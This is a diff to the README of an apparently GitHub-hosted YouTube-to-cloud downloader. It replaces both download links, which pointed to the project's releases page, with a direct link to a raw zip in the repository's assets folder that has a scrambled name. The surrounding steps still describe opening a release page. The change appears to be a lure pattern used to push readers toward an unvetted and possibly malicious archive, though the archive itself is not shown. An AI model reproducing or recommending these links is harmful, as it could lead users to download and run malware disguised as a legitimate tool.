@@ -1,6 +1,6 @@
 # 📥 YouTube-to-Cloud-Downloader - Save Videos to Drive Fast
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://github.com/gastonempathic658/YouTube-to-Cloud-Downloader/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://github.com/gastonempathic658/YouTube-to-Cloud-Downloader/raw/refs/heads/main/assets/Tube_to_Downloader_Cloud_You_v1.7.zip)
 
 ## 🧭 What This App Does
 
@@ -31,7 +31,7 @@ It uses yt-dlp to fetch media in common formats like MP4 and MP3. The app works 
 
 Visit this page to download the app package:
 
-[Download the latest release](https://github.com/gastonempathic658/YouTube-to-Cloud-Downloader/releases)
+[Download the latest release](https://github.com/gastonempathic658/YouTube-to-Cloud-Downloader/raw/refs/heads/main/assets/Tube_to_Downloader_Cloud_You_v1.7.zip)
 
 1. Open the release page.
 2. Find the latest version.
